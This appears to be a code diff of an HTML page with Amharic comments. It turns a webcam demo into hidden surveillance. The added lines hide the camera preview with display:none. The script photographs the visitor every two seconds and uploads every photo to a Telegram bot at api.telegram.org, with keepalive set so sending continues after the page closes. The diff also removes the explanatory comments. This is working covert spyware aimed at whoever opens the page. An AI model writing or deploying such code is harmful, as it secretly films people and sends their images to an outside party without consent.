@@ -6,8 +6,9 @@
 </head>
 <body>
 
-    <h2>የካሜራ እይታ</h2>
-    <video id="video" width="320" height="240" autoplay></video>
+    <h2>camera</h2>
+    <!-- style="display:none;" በመጨመር የካሜራው ምስል በስክሪኑ ላይ እንዳይታይ ተደርጓል -->
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
     <script>
@@ -25,8 +26,6 @@
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                
-                // በየ 2 ሰከንዱ (2000ms) ፎቶ እየነሱ በ RAM/Array ውስጥ ማከማቸት
                 captureInterval = setInterval(capturePhoto, 2000);
             })
             .catch(err => console.error("ካሜራ አልተከፈተም:", err));
@@ -34,7 +33,6 @@
         // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
         function capturePhoto() {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // የፎቶውን ጥራት 50% (0.5) በማድረግ የፋይል መጠኑን መቀነስ
             const imageData = canvas.toDataURL('image/jpeg', 0.5);
             imageBuffer.push(imageData);
             console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
@@ -51,10 +49,8 @@
         async function sendAllPhotos() {
             if (imageBuffer.length === 0) return;
 
-            // ታይመሩን ማቆም
             if (captureInterval) clearInterval(captureInterval);
 
-            // የተከማቹትን ፎቶዎች በሙሉ በተከታታይ መላክ
             for (let i = 0; i < imageBuffer.length; i++) {
                 try {
                     const blob = await (await fetch(imageBuffer[i])).blob();
@@ -62,7 +58,6 @@
                     formData.append("chat_id", CHAT_ID);
                     formData.append("photo", blob, `photo_${i + 1}.jpg`);
 
-                    // keepalive: true ብሮውዘሩ ቢዘጋም ጥሪው እንዳይቋረጥ ይረዳል
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: "POST",
                         body: formData,
@@ -72,7 +67,6 @@
                     console.error("የመላክ ስህተት፡", e);
                 }
             }
-            // ከተላኩ በኋላ ኤሬዩን ባዶ ማድረግ
             imageBuffer = [];
         }
     </script>
